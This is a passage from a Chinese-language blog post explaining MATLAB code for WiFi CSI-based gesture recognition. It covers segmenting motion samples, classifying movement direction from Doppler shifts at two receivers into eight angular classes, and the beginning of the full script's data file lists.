<h2 id="u52A8_u4F5C_u5206_u7247"><a href="#u52A8_u4F5C_u5206_u7247" class="headerlink" title="动作分片"></a>动作分片</h2><p>动作分片其实可以和动作检测看成一个整体，就是将所有包含动作的数据包进行切片出来，然后拼接在一起。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Segmentation...</span>
    segm_lowb <span class="token operator">=</span> <span class="token number">0.8</span><span class="token punctuation">;</span>
    segm_higb <span class="token operator">=</span> <span class="token number">1.2</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> ii <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_note<span class="token punctuation">,</span>
        <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_indx<span class="token punctuation">;</span>
        <span class="token keyword">if</span> ii <span class="token operator">&lt;</span> n_note<span class="token punctuation">,</span>
            curr_ener <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">prof_ener</span><span class="token punctuation">(</span>note_indx<span class="token operator">:</span><span class="token function">min</span><span class="token punctuation">(</span>note_indx<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>note_inte<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">size</span><span class="token punctuation">(</span>prof_ener<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> segm_poin<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">curr_ener</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_higb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_indx<span class="token operator">+</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span>segm_poin<span class="token number">-1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx:min(note_indx+2*note_inte-1,size(prof_ener,1))), curr_ener);</span>
<span class="token comment" spellcheck="true">%             hold on;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx-1+floor(note_inte*segm_lowb)+segm_poin), curr_ener(floor(note_inte*segm_lowb)+segm_poin), </span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             hold off;</span>
            note_indx <span class="token operator">=</span> note_indx<span class="token operator">+</span><span class="token function">floor</span><span class="token punctuation">(</span>note_inte<span class="token operator">*</span>segm_lowb<span class="token punctuation">)</span><span class="token operator">+</span>segm_poin<span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            curr_ener <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">prof_ener</span><span class="token punctuation">(</span>note_indx<span class="token operator">:</span>note_end<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> note_end<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             plot(time_bins(note_indx:note_end), curr_ener);</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
</code></pre>
<h2 id="u52A8_u4F5C_u8BC6_u522B"><a href="#u52A8_u4F5C_u8BC6_u522B" class="headerlink" title="动作识别"></a>动作识别</h2><p>动作识别是整个论文最关键的地方，准确的说，应该是方向识别。引入两个接收端，来同时计算出多普勒频移，通过比对动作对两个接收端的多普勒频移，来进行动作识别。这种方法无需训练，可以即时的计算出方向。正如论文提到的，动作识别分为两类，以第一象限为例子，理论上是0°，45°，90°为三类，但实际上这个是需要修正的，因为真实情况中，并不会如此精确，所以论文中以0-30°，30-60°，60-90°来划分三类，按照这样来划分，实际上360°可以划分为8个区块(0-30°和-30-0°是一个区块)。接着进行第二次识别，第二次识别就用到了两个设备的数据。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Recognition..</span>
    <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>prof_cent<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_cent(:,kk) = smooth(powe_cent(:,kk), samp_rate/4+1, </span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">end</span>
    <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">~</span>moti_inde<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    prof_cent_tota <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>prof_cent<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>
    prof_cent_tota <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span>prof_cent_tota<span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     powe_cent(~moti_inde,:) = 0;</span>
<span class="token comment" spellcheck="true">%     powe_cent_tota = sum(abs(powe_cent),2)/2;</span>
<span class="token comment" spellcheck="true">%     powe_cent_tota = smooth(powe_cent_tota, samp_rate/8+1, </span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    note_list <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    tx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.6</span><span class="token punctuation">,</span><span class="token number">1.6</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    rx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.6</span><span class="token punctuation">;</span><span class="token number">1.6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    init_loc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">]</span><span class="token operator">.'</span><span class="token punctuation">;</span>
    tant_valu <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dire_valu <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>n_note<span class="token punctuation">)</span><span class="token punctuation">;</span>
    peak_dist <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> ii <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_note<span class="token punctuation">,</span>
        curr_cent <span class="token operator">=</span> <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_cent_tota <span class="token operator">=</span> <span class="token function">prof_cent_tota</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         curr_powe_cent = powe_cent(note_segm(ii,1):note_segm(ii,2),:);</span>
<span class="token comment" spellcheck="true">%         curr_powe_cent_tota = powe_cent_tota(note_segm(ii,1):note_segm(ii,2),:);</span>
        curr_cent <span class="token operator">=</span> <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token function">moti_inde</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        curr_cent_tota <span class="token operator">=</span> <span class="token function">curr_cent_tota</span><span class="token punctuation">(</span><span class="token function">moti_inde</span><span class="token punctuation">(</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">note_segm</span><span class="token punctuation">(</span>ii<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        midd_poin <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>curr_cent_tota<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firs_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        seco_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token function">firs_half</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">seco_half</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        curr_cent <span class="token operator">=</span> curr_cent <span class="token operator">-</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">mean</span><span class="token punctuation">(</span>curr_cent<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">size</span><span class="token punctuation">(</span>curr_cent<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firs_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span>midd_poin<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        seco_half <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">curr_cent</span><span class="token punctuation">(</span>midd_poin<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token keyword">end</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         if (mark_list(ii) >= 1 &amp;&amp; mark_list(ii) &lt;= 2) || (mark_list(ii) == 8),</span>
<span class="token comment" spellcheck="true">%             firs_half(2) = firs_half(2);</span>
<span class="token comment" spellcheck="true">%             seco_half(2) = seco_half(2);</span>
<span class="token comment" spellcheck="true">%         elseif (mark_list(ii) >= 4 &amp;&amp; mark_list(ii) &lt;= 6),</span>
<span class="token comment" spellcheck="true">%             firs_half(1) = firs_half(1);</span>
<span class="token comment" spellcheck="true">%             seco_half(1) = seco_half(1);</span>
<span class="token comment" spellcheck="true">%         end</span>
        <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atan2</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">firs_half</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">seco_half</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">firs_half</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">seco_half</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">pi</span> <span class="token operator">*</span> <span class="token number">180</span><span class="token punctuation">;</span>        
        <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> firs_half <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">,</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">elseif</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">,</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">else</span>
            <span class="token keyword">if</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
            <span class="token keyword">elseif</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token keyword">elseif</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mod</span><span class="token punctuation">(</span><span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         if tant_valu(ii) > 45,</span>
<span class="token comment" spellcheck="true">%             if dire_valu(1,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 8;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 4;</span>
<span class="token comment" spellcheck="true">%             end</span>
<span class="token comment" spellcheck="true">%         else</span>
<span class="token comment" spellcheck="true">%             if dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 6;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 2;</span>
<span class="token comment" spellcheck="true">%             end</span>
<span class="token comment" spellcheck="true">%         end</span>

<span class="token comment" spellcheck="true">%             if dire_valu(1,ii) == 1 &amp;&amp; dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 7;</span>
<span class="token comment" spellcheck="true">%             elseif dire_valu(1,ii) == 1 &amp;&amp; dire_valu(2,ii) == 0,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 1;</span>
<span class="token comment" spellcheck="true">%             elseif dire_valu(1,ii) == 0 &amp;&amp; dire_valu(2,ii) == 1,</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 5;</span>
<span class="token comment" spellcheck="true">%             else</span>
<span class="token comment" spellcheck="true">%                 note_list(ii) = 3;</span>
<span class="token comment" spellcheck="true">%             end</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token string">'index:%d... tant:%f... dire: %d,%d... mark: %d... pred: %d\n'</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token function">tant_valu</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">dire_valu</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mark_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">note_list</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>上述简单分析了整个实验的流程和代码，有些地方没有细细讲解，也有部分没有看懂，欢迎指正。以下是完整的代码。当然这个完整代码依赖一些其他的函数，考虑到完整的数据太大，打包了包含部分数据的完整代码上传至百度云。</p>
<pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%% Load CSI data.</span>
data_path <span class="token operator">=</span> <span class="token string">'data/final/'</span><span class="token punctuation">;</span>
resu_path <span class="token operator">=</span> <span class="token string">'experiment/all_2.mat'</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">%% Total Training</span>
training_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'P1-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P1-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token string">'P3-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P3-A1-I2-G2'</span><span class="token punctuation">,</span> <span class="token string">'P4-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P4-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token string">'P5-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P5-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G2'</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token string">'P1-A3-I2-G2'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
training_inde <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2540</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token number">2300</span><span class="token punctuation">,</span><span class="token number">2150</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token number">2890</span><span class="token punctuation">,</span><span class="token number">2800</span><span class="token punctuation">,</span><span class="token number">2500</span><span class="token punctuation">,</span><span class="token number">2400</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token number">3400</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token number">2300</span><span class="token punctuation">,</span><span class="token number">1150</span><span class="token punctuation">,</span><span class="token punctuation">...</span>
    <span class="token number">2050</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">%% Total Testing</span>
testing_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'P1-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P1-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token string">'P2-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P3-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P3-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token string">'P4-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P4-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P5-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P5-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token string">'P1-A2-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P1-A3-I2-G3'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
indx_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3200</span><span class="token punctuation">,</span><span class="token number">3230</span><span class="token punctuation">,</span> <span class="token number">2250</span><span class="token punctuation">,</span><span class="token number">2900</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token number">3000</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token number">2350</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token number">2550</span><span class="token punctuation">,</span><span class="token number">1850</span><span class="token punctuation">,</span> <span class="token number">2500</span><span class="token punctuation">,</span><span class="token number">2100</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token number">1900</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

prefix_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'P1-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P1-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P1-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P1-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P2-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P2-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
